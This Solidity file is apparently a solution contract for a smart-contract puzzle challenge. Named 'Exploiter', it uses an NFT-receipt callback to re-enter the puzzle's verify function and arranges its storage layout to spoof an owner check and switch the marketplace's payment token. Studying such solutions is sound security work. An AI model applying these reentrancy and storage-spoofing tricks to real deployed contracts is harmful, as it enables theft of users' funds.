// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { BillyTheBull } from "../src/BillyTheBull.sol";
import { NFTOutlet } from "../src/NFTOutlet.sol";
import { BoredSlothYachtClub } from "../src/tokens/BoredSlothYachtClub.sol";

contract Exploiter {
    address owner;
    uint[2] _gap;
    bool flag;
    address immutable solver;
    BillyTheBull constant puzzle = BillyTheBull(0xa0Cb889707d426A7A386870A03bc70d1b0697598); // available
    address constant bsyc = 0xc7183455a4C133Ae270771860664b6B7ec320bB1; // available
    address constant nftOutlet = 0x83B4EEa426B7328eB3bE89cDb558F18BAF6A2Bf7; // available
    uint immutable t1;
    uint immutable t2;

    constructor(uint _t1, uint _t2) {
        solver = msg.sender;
        t1 = _t1;
        t2 = _t2;
        BoredSlothYachtClub(bsyc).setApprovalForAll(nftOutlet, true);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (!flag) {
            flag = true;
            puzzle.verify(t1 << 128 | t2, uint160(address(this)));
        }
        return this.onERC721Received.selector;
    }

    function getMagicTokenId() external returns (uint) {
        if (address(NFTOutlet(nftOutlet).paymentToken()) == bsyc) {
            return t2;
        } else {
            owner = address(this);
            NFTOutlet(nftOutlet).changePaymentToken(bsyc);
            owner = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496; // hardcode owner of puzzle
            return t1;
        }
    }
}
